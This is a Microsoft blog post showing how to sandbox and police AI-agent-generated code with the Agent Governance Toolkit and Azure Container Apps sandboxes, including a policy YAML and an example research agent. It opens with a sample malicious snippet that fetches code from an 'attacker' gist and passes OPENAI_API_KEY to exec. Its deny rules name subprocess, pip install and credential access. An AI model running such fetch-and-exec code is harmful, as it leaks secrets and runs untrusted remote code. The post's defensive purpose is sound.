---
source: "https://techcommunity.microsoft.com/blog/linuxandopensourceblog/govern-ai-agents-using-agent-governance-toolkit-and-azure-container-app-sandboxe/4526011"
title: "Govern AI Agents Using Agent Governance Toolkit and Azure Container App Sandboxes | Microsoft Community Hub"
author: "unknown"
date_published: "2026-06-05"
date_clipped: "2026-06-12"
category: "Azure & Cloud"
source_type: "web"
---

14 MIN READ

# Govern AI Agents Using Agent Governance Toolkit and Azure Container App Sandboxes

[amolravande](/users/amolravande/3525035)

Microsoft

Jun 05, 2026

## Stack: Agent Governance Toolkit (AGT) + Azure Container Apps(ACA) sandbox preview Audience: Agent platform engineers, security engineers, AGT contributors, Azure architect

When you let a model generate code and you actually execute it, you are handing the model a Python REPL on whatever machine runs the agent. That sounds alarmist — right up until a planner (yours, mine, or anyone else's) produces a snippet that reads as harmless on the first pass:

```
# "summarize the changelog" import urllib.request, os data = urllib.request.urlopen( "https://gist.githubusercontent.com/attacker/.../raw" ).read() exec(data, {"OPENAI_API_KEY": os.environ["OPENAI_API_KEY"]})
```

Two lines of mostly-stdlib Python. If it runs in your application process, the model just decided it could pull arbitrary code off the internet and pass your secrets into it. Today that's a hypothetical; tomorrow it's a postmortem.

The defense splits into two questions developers can actually answer:

1. **Where does the code run?** Not in your process. A *sandbox* — a separate, disposable execution environment with its own CPU, memory, filesystem and network — gives you a hard boundary so a bad snippet can crash itself, not your service. Sandboxes have shipped in many flavors (containers, micro-VMs, wasm); the new one in this post is **Azure Container Apps sandbox**, where each agent session gets a managed, per-session container with a fail-closed egress proxy in front, scaled and operated by Azure.
2. **What is the code allowed to do?** A sandbox alone is a wide playing field — an attacker who wins a sandbox still has the whole sandbox. *Policy* narrows the field. A single YAML PolicyDocument says: these tools, these hosts, these CPU / memory / time budgets, no subprocess, no pip install, no substring match on OPENAI\_API\_KEY. The first cut is enforced **on the host by AGT policy** (deny rules, tool allowlist, AST scan) so denied snippets never even leave your process; the network cut is enforced **inside the ACA sandbox by the egress allowlist** so an outbound call to a non-allowed host fails closed at the proxy. Same document, two layers, no drift.

[AGT](https://github.com/microsoft/agent-governance-toolkit) ships a Python package — agt-sandbox — that answers both, and a recently added sandbox provider that was recently announced in Build 2026 - Azure container app sandboxes. The rest of this post walks through what's in the agt-sandbox package, the abstraction it pivots on, the new ACA provider, how it composes with AGT policy, and a full LLM-planned research agent built on top.

## 1. What is Azure Container Apps sandbox?

[Azure Container Apps Sandboxes](https://techcommunity.microsoft.com/blog/appsonazureblog/introducing-azure-container-apps-sandboxes-secure-infrastructure-for-agentic-wor/4524131) (public preview, June 2, 2026) are a first-class Azure resource — Microsoft.App/SandboxGroups — purpose-built for running untrusted, agent-generated code. Each sandbox runs in its own **hardware-isolated microVM**, boots in sub-second time from an OCI disk image, and can suspend/resume from full memory + disk snapshots for scale-to-zero economics on stateful compute. It's the same primitive that powers Cloud sandboxes in GitHub Copilot, Foundry Hosted Agents, and ACA Express.

See - <https://techcommunity.microsoft.com/blog/appsonazureblog/introducing-azure-container-apps-sandboxes-secure-infrastructure-for-agentic-wor/4524131> for more info on the service

If you've used [ACA Dynamic Sessions](https://learn.microsoft.com/en-us/azure/container-apps/sessions), Sandboxes are the next evolution and where new work should target.

## 2. What's in the agt-sandbox package

agt-sandbox (PyPI: [agt-sandbox](https://pypi.org/project/agt-sandbox/), import name: agent\_sandbox) is the execution-isolation layer of AGT. It is intentionally small. Its job is to take a snippet of agent- generated code and run it somewhere that is **not** your application process — under policy, with a structured result.

The package contains:

- **SandboxProvider** — the abstract base class every backend implements (next section).
- **Three built-in providers**, each gated behind an install extra so you only pull what you need:
  - DockerSandboxProvider — hardened OCI containers, with an optional auto-upgrade to gVisor or Kata when present (pip install "agt-sandbox[docker]").
  - HyperLightSandboxProvider — sub-millisecond [Hyperlight](https://github.com/hyperlight-dev/hyperlight) micro-VMs over KVM / mshv / WHP (pip install "agt-sandbox[hyperlight]").
  - ACASandboxProvider — Azure Container Apps managed sandbox sessions (pip install "agt-sandbox[azure]"); **the focus of this post**.
- **Shared dataclasses** — SandboxConfig, SandboxResult, SessionHandle, ExecutionHandle, plus SessionStatus / ExecutionStatus enums. Every provider returns these same types, so calling code never special-cases the backend.
- **Policy-projection helpers** — small per-provider functions (docker\_config\_from\_policy, aca\_config\_from\_policy, …) that translate the AGT PolicyDocument into provider-native settings (CPU / memory caps, egress rules, env vars).

## 3. The SandboxProvider ABC

SandboxProvider is the contract every backend implements. The abstract surface is deliberately minimal:

```
class SandboxProvider(ABC): @abstractmethod def create_session(self, agent_id, policy=None, config=None) -> SessionHandle: ... @abstractmethod def execute_code(self, agent_id, session_id, code, *, context=None) -> ExecutionHandle: ... @abstractmethod def destroy_session(self, agent_id, session_id) -> None: ... @abstractmethod def is_available(self) -> bool: ...
```

Every method has an \*\_async variant that delegates to the sync implementation through asyncio.to\_thread by default, so an async agent can call await provider.execute\_code\_async(...) without each provider having to ship its own event-loop story.

The contract features four things, and writing against the ABC means you get all of them no matter which backend is plugged in:

| Feature | What it means |
| --- | --- |
| **Per-session isolation** | One (agent\_id, session\_id) pair maps to exactly one sandbox; concurrent agents do not share state |
| **Policy as a first-class argument** | create\_session accepts a PolicyDocument; the provider projects it onto its native primitives |
| **Host-side PolicyEvaluator gate** | Every execute\_code call runs the evaluator **before** dispatching code; denied calls never touch the backend |
| **Structured SandboxResult** | Same success / exit\_code / stdout / stderr / killed / kill\_reason / duration\_seconds shape from all backends |

Per-session isolation is the right unit of granularity because a session is also the natural unit for blast radius and identity: within one session the agent's working state survives across execute\_code calls (same (agent\_id, session\_id) → same sandbox in the provider's cache), and when the session is destroyed the sandbox is deleted with it. Different sessions get different sandboxes — create\_session always provisions a fresh one and returns a new session\_id, so there is no in-process pathway for state to flow from one session to the next.

The hard isolation between two live sandboxes — that a compromised session cannot read another session's filesystem, memory, or network — is ultimately an **Azure platform guarantee** about inter-sandbox isolation within a sandbox group, not something AGT itself enforces. The provider is a thin lifecycle driver.

The abstraction matters in practice because **the same agent code works on every backend**. You write your planner against SandboxProvider and you choose Docker, Hyperlight for local sandboxes and ACA for managed cloud sandboxes — by swapping one constructor:

## 4. The new ACASandboxProvider

ACASandboxProvider is the most recent addition in AGT. It drives the early-access [azure-containerapps-sandbox](https://github.com/microsoft/azure-container-apps) Python SDK so an agent step can run in a managed Azure-side container without any of the usual infrastructure plumbing.

Under the hood, ACASandboxProvider wires the three SandboxProvider lifecycle methods straight onto the ACA SDK. Here's what each one actually does for you:

**create\_session(agent\_id, policy=None, config=None)** — provisions a fresh ACA sandbox for the agent and applies the policy's resource caps and egress allowlist. *Returns* a SessionHandle.

**execute\_code(agent\_id, session\_id, code, \*, context=None)** — runs host-side policy checks, then executes the snippet inside the sandbox. A policy denial raises PermissionError. *Returns* an ExecutionHandle carrying a SandboxResult.

**destroy\_session(agent\_id, session\_id)** — deletes the underlying ACA sandbox and evicts cached state. *Returns* None.

The lifecycle in code looks like this:

```
import os from agent_sandbox import ACASandboxProvider from agent_os.policies import PolicyDocument policy = PolicyDocument.from_yaml("policies/aca_research_agent.yaml") provider = ACASandboxProvider( resource_group=os.environ["AZURE_RG"], sandbox_group="agents", region=os.environ["AZURE_REGION"], disk="python-3.13", # constructor-level, not per-session ensure_group_location=os.environ["AZURE_REGION"], ) # create_session takes (agent_id, policy=..., config=...). The policy carries # the network allowlist and the CPU/memory/timeout defaults. handle = provider.create_session("research-agent-1", policy=policy) # execute_code takes (agent_id, session_id, code, *, context=...). # The timeout is read from the session config that was projected from # policy.defaults.timeout_seconds at create_session time. exec_handle = provider.execute_code( "research-agent-1", handle.session_id, "import urllib.request as u; print(u.urlopen('https://arxiv.org').status)", context={"intent": "smoke-test arxiv reachability"}, ) print(exec_handle.result.stdout) provider.destroy_session("research-agent-1", handle.session_id)
```

ACA Sandboxes hit the sweet spot for a production agent platform on Azure: managed (no nodes or Kubernetes to operate), regional and autoscaled, fast enough for per-session creation, integrated with VNet / managed identity / Log Analytics, and rich enough on Azure-native primitives that the AGT policy bundle can be rendered into platform-level controls automatically.

## 5. How ACASandboxProvider integrates with Agent governance toolkit policy

The provider's contribution to governance is that it makes a single PolicyDocument enforce in three different places, with the most expensive checks running last.

**Before any Azure round-trip (host-side, in your process):**

1. The host-side PolicyEvaluator (constructed once per session) evaluates deny rules over code / tool\_name, tool\_allowlist, and the per-call context. A deny becomes PermissionError. This runs on **every** execute\_code call, so a denied step costs zero Azure cycles.
2. enforce\_no\_subprocess\_execution then walks the snippet's AST and raises SandboxCodeViolation if subprocess.\*, os.system, os.execve, os.spawn\*, or wildcard imports of those modules appear. This catches the cases where a contains rule misses (e.g. obfuscated imports, from subprocess import Popen as p).

**At sandbox creation (Azure-side, once per session):**

1. aca\_config\_from\_policy projects defaults.max\_cpu / defaults.max\_memory\_mb onto the sandbox's CPU and memory ceilings.
2. network\_allowlist plus defaults.network\_default are turned into a typed EgressPolicy(default\_action="Deny", host\_rules=[EgressHostRule(pattern, action="Allow"), …]) and applied via SandboxClient.set\_egress\_policy. The policy is **fail-closed by default** — even with an empty allowlist you get a sandbox with no outbound network.

**Per execution:**

1. *Azure-side, every call.* The egress proxy enforces (4) on every outbound connection inside the sandbox. A blocked host produces an HTTP 403 inside the guest; the snippet's own error handler can detect that, and the provider's caller surfaces it as a blocked-at-egress outcome.
2. *Host-side, post-exec tripwire.* After SandboxClient.exec returns, the provider compares the measured duration\_seconds against defaults.timeout\_seconds and, if the budget was exceeded, sets result.killed=True and a kill\_reason on the returned SandboxResult. This is an **advisory marker**, not a kill signal: the snippet has already finished, and the sandbox session itself stays alive and reusable. Acting on it (abandoning the session, surfacing a timeout decision) is the agent loop's job — see how run\_step in section 6.3 turns it into a "timeout" receipt.

One PolicyDocument, six enforcement points, three different locations. The model is never trusted; each guarantee is enforced by the component closest to the resource it protects.

## 6. The example: an LLM-planned research agent

The agent does one thing: given a *research ticket* — a small JSON document like {"topic": "differential privacy", "depth": "survey"} — produce a short literature summary. To do that it needs to (a) read papers from arXiv, (b) skim associated GitHub READMEs, and (c) optionally query a local search index. Nothing else.

The interesting part is **how the agent decides what code to run**. A GPT-class planner is asked to break the ticket into a list of steps, each step a short Python snippet. Those snippets are then executed one at a time — each one passing through the six-point gauntlet from section 5.

### 6.1 Install

```
# agt-sandbox with the Azure provider + the policy engine pip install "agt-sandbox[azure,policy]" # Early-access Azure Container Apps sandbox SDK pip install azure-containerapps-sandbox # Optional: only needed for the LLM planner in section 5.3 pip install openai
```

One-time Azure setup (resource group must already exist — the provider auto-creates the *sandbox group* on first use, but not the resource group):

```
az login az group create --name agents-rg --location westus2 $env:AZURE_SUBSCRIPTION_ID = (az account show --query id -o tsv) $env:AZURE_RG = "agents-rg" $env:AZURE_REGION = "westus2"
```

Quick smoke check:

```
from agent_sandbox import ACASandboxProvider from agent_os.policies import PolicyDocument print("ok")
```

Ignore the deprecated warning here. The packages are in the midst of migration and will be fixed soon.

### 6.2 The policy

aca\_research\_agent.yaml — every field is a **native PolicyDocument field**, no Python wrapper:

```
name: research-agent version: "2" defaults: action: allow max_cpu: 1.0 # → sandbox CPU cap = 1000 millicores max_memory_mb: 2048 # → sandbox memory cap = 2048 MiB timeout_seconds: 90 # per-execute_code wall-clock kill network_default: deny # fail-closed (also the schema default) network_allowlist: - api.openai.com - api.arxiv.org - export.arxiv.org - "*.github.com" - pypi.org - files.pythonhosted.org tool_allowlist: - fetch_arxiv - fetch_github_readme - search_index rules: - name: deny-shell-out-subprocess condition: { field: code, operator: contains, value: "subprocess" } action: deny priority: 100 message: "shell-out blocked by research-agent policy" - name: deny-pip-install condition: { field: code, operator: contains, value: "pip install" } action: deny priority: 100 message: "ad-hoc dependency installs are not permitted" - name: deny-secret-openai condition: { field: code, operator: contains, value: "OPENAI_API_KEY" } action: deny priority: 100 message: "agents may not read host credentials" # Tool-allowlist gate. Fires only when the eval context carries a # `tool_name` — untagged execute_code calls are unaffected. - name: deny-tool-not-in-allowlist condition: field: tool_name operator: not_in value: [fetch_arxiv, fetch_github_readme, search_index] action: deny priority: 200 message: "tool not in research-agent tool_allowlist"
```

Two properties to keep in mind:

1. **Network is fail-closed.** Any host not on network\_allowlist is denied at the Azure egress proxy. An empty allowlist produces a sandbox with no outbound network.
2. **tool\_allowlist only fires when the call is tagged.** Plain execute\_code\_async(...) has no tool\_name. Calls that pass context={"tool\_name": "evil\_tool"} get denied host-side.

Validate before committing:

```
python -m agent_os.policies.cli validate aca_research_agent.yaml # OK
```

### 6.3 The agent

```
import asyncio, json, os, time, uuid from dataclasses import dataclass from agent_os.policies import PolicyDocument from agent_sandbox import ACASandboxProvider from openai import AsyncOpenAI @dataclass class Step: index: int; intent: str; code: str @dataclass class StepReceipt: step_index: int; intent: str decision: str # allowed | denied-by-policy | blocked-at-egress | timeout | error reason: str | None azure_sandbox_id: str duration_seconds: float stdout_excerpt: str PLANNER_SYSTEM = """You are a research planner. Output JSON of the form {"steps":[{"intent": str, "code": str}, ...]} where each `code` is self-contained Python using only the standard library (use urllib.request for HTTP, not requests). Snippets may reach: api.arxiv.org, export.arxiv.org, *.github.com, pypi.org. No installs, no shell, no secrets.""" async def plan(client: AsyncOpenAI, ticket: dict) -> list[Step]: resp = await client.chat.completions.create( model="gpt-4o-mini", response_format={"type": "json_object"}, messages=[ {"role": "system", "content": PLANNER_SYSTEM}, {"role": "user", "content": json.dumps(ticket)}, ], ) plan = json.loads(resp.choices[0].message.content) return [Step(i, s["intent"], s["code"]) for i, s in enumerate(plan["steps"])] async def run_step(provider, agent_id, session_id, step: Step) -> StepReceipt: started = time.monotonic() try: exec_handle = await provider.execute_code_async( agent_id, session_id, step.code, context={"step_index": step.index, "intent": step.intent}, ) except PermissionError as exc: return StepReceipt(step.index, step.intent, "denied-by-policy", str(exc), session_id, time.monotonic() - started, "") res = exec_handle.result combined = (res.stdout or "") + (res.stderr or "") egress_block = "egress-blocked" in combined or "HTTP Error 403" in combined if getattr(res, "killed", False): decision, reason = "timeout", getattr(res, "kill_reason", "timeout") elif egress_block: decision, reason = "blocked-at-egress", "Azure egress proxy denied a host" elif res.success: decision, reason = "allowed", None else: decision, reason = "error", (res.stderr or "").strip()[:200] return StepReceipt( step.index, step.intent, decision, reason, session_id, time.monotonic() - started, (res.stdout or "").strip()[:200], ) async def main(ticket_path: str) -> None: ticket = json.loads(open(ticket_path, encoding="utf-8").read()) policy = PolicyDocument.from_yaml("aca_research_agent.yaml") missing = [k for k in ("AZURE_SUBSCRIPTION_ID", "AZURE_RG") if not os.environ.get(k)] if missing: raise SystemExit(f"missing env vars: {', '.join(missing)}") provider = ACASandboxProvider( subscription_id=os.environ["AZURE_SUBSCRIPTION_ID"], resource_group=os.environ["AZURE_RG"], sandbox_group="agents", region=os.environ.get("AZURE_REGION", "westus2"), disk="python-3.13", ensure_group_location=os.environ.get("AZURE_REGION", "westus2"), ) if not provider.is_available(): raise SystemExit(provider.unavailable_reason) agent_id = f"research-{uuid.uuid4().hex[:6]}" handle = await provider.create_session_async(agent_id, policy=policy) try: steps = await plan(AsyncOpenAI(), ticket) receipts = [await run_step(provider, agent_id, handle.session_id, s) for s in steps] print(json.dumps([r.__dict__ for r in receipts], indent=2, default=str)) finally: await provider.destroy_session_async(agent_id, handle.session_id) if __name__ == "__main__": import sys asyncio.run(main(sys.argv[1]))
```

Run it against {"topic": "differential privacy", "depth": "survey"} and you get a JSON array of receipts on stdout — one per planner step. A typical five-step plan produces output along the lines of:

```
[ {"step_index": 0, "intent": "fetch arXiv search results", "decision": "allowed", "reason": null, "azure_sandbox_id": "sb-7f4a92...", "duration_seconds": 1.42, "stdout_excerpt": "{\"feed\": {\"entry\": [{\"id\": \"http://arxiv.org/abs/2201.12345v2\", ..."}, {"step_index": 1, "intent": "download README for top GitHub repo", "decision": "allowed", "reason": null, "azure_sandbox_id": "sb-7f4a92...", "duration_seconds": 0.88, "stdout_excerpt": "# opendp\n\nThe OpenDP Library is a modular collection..."}, {"step_index": 2, "intent": "shell out to grep README", "decision": "denied-by-policy", "reason": "Policy denied: shell-out blocked by research-agent policy", "azure_sandbox_id": "sb-7f4a92...", "duration_seconds": 0.003, "stdout_excerpt": ""}, {"step_index": 3, "intent": "fetch related blog post from third-party site", "decision": "blocked-at-egress", "reason": "Azure egress proxy denied a host", "azure_sandbox_id": "sb-7f4a92...", "duration_seconds": 0.41, "stdout_excerpt": "egress-blocked HTTPError HTTP Error 403: Forbidden"}, {"step_index": 4, "intent": "summarize collected abstracts", "decision": "allowed", "reason": null, "azure_sandbox_id": "sb-7f4a92...", "duration_seconds": 0.32, "stdout_excerpt": "Summary: differential privacy research in 2024-2026..."} ]
```

Three things to notice:

- Step 2 (subprocess) was rejected **host-side** in ~3 ms with no Azure round-trip — duration\_seconds and the empty stdout\_excerpt confirm it never left the host process.
- Step 3 went to Azure but the egress proxy returned HTTP 403; the caller's try/except converted that into a clean blocked-at-egress decision instead of a hard failure.
- The session survives both rejections. Step 4 still runs to completion — denials and egress blocks do not poison the sandbox.

## What you've enforced

| Concern | Where enforced | Mechanism |
| --- | --- | --- |
| Shell-out, pip-install, credential exfiltration | Host process | PolicyDocument deny rules → PermissionError |
| Subprocess invocation that slips past substring rules | Host process | enforce\_no\_subprocess\_execution AST scan → SandboxCodeViolation |
| Calls to tools outside the allowlist | Host process | deny-tool-not-in-allowlist rule |
| Outbound traffic to disallowed hosts | Azure egress proxy | network\_allowlist → EgressPolicy (Deny + per-host Allow) |
| CPU / memory ceiling | Azure sandbox VM | defaults.max\_cpu / defaults.max\_memory\_mb |
| Per-step wall-clock tripwire | Host, post-exec (advisory) | defaults.timeout\_seconds → SandboxResult.killed=True |
| Audit trail | Host process | Per-step receipts from run\_step |

The model is never trusted. Each guarantee is enforced by the component closest to the resource it protects, and a single signed PolicyDocument drives all of them.

## Closing thoughts

A few things worth keeping in mind:

- **One PolicyDocument is the artefact.** Host-side rules, AST scan, ACA egress proxy, CPU / memory caps, timeouts — all driven by one YAML file. Treat it like code: review it, diff it, and validate it in CI.
- **Fail-closed by default.** ACA's network\_default: deny is the setting you want. Every host the agent reaches should be in the allowlist, by name, in a reviewable diff.
- **Read the receipts.** StepReceipt JSON is the audit trail. Pipe it into Log Analytics and alert on denied-by-policy and blocked-at-egress spikes — they're either attacks or planner regressions.
- **The model is never trusted.** Every check in this post exists because the moment you trust the model, you've also trusted whatever fed it its last few tokens.

The project lives at [github.com/microsoft/agent-governance-toolkit](https://github.com/microsoft/agent-governance-toolkit). Issues, PRs, and war stories welcome.

Updated Jun 05, 2026

Version 1.0

[security](/tag/security?nodeId=board%3ALinuxandOpenSourceBlog)

Comment

[amolravande](/users/amolravande/3525035)

Microsoft

Joined June 04, 2026

Send Message

[View Profile](/users/amolravande/3525035)

[Linux and Open Source Blog](/category/azure/blog/linuxandopensourceblog)

Follow this blog board to get notified when there's new activity
